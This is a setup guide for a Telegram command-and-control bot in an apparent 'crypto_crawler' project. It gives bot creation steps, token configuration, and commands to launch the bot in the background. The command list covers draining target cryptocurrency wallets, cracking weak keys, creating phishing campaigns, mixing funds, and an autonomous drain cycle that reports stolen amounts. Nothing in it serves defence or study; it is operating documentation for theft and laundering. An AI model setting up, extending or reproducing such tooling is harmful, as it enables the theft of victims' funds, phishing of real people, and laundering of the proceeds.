# C2 Telegram Bot Setup Guide

## Create Bot

1. Open Telegram → search @BotFather
2. Send /newbot → pick name → get token
3. Send /setprivacy → @BotFather → pick bot → Disable privacy mode
4. Send /setjoingroups → pick bot → Enable

## Get Your Chat ID

curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates"
Send a message to the bot, then re-run. Chat_id is in the response.

## Configure

Option A - config.json:
  "c2": { "telegram_token": "1234567890:ABCdef...", "admin_chat_ids": [123456789] }

Option B - environment variable:
  export C2_TELEGRAM_TOKEN="1234..."

## Start Bot

cd /media/kubuntux/DEVELOPMENT1/crypto_crawler
./venv/bin/python3 -c 'from remote.c2_bot import C2Bot; C2Bot().start_polling()'

Or background:
nohup ./venv/bin/python3 -c 'import sys; sys.path.insert(0, "."); from remote.c2_bot import C2Bot; C2Bot().start_polling()' > logs/c2_bot.log 2>&1 &

## Bot Commands

/status   - System status, wallet count, dry/live
/balance  - Target wallet balances across all chains
/drain    - Run drain cycle
/crawl    - Run surface web crawl
/crack    - Scan weak keys
/scan     - Scan all known wallets for balances
/phish    - Create phishing campaigns
/mix      - Execute mixing plan
/stats    - Detailed metrics
/config   - Show current config
/start    - Start autonomous cycle (10min interval)
/stop     - Stop autonomous cycle
/help     - List all commands

## Auto-Notify Events

- Drain executed: chain, amount, tx hash
- Auto-cycle complete: crawl/scan/drain summary
- Error: component name + error message
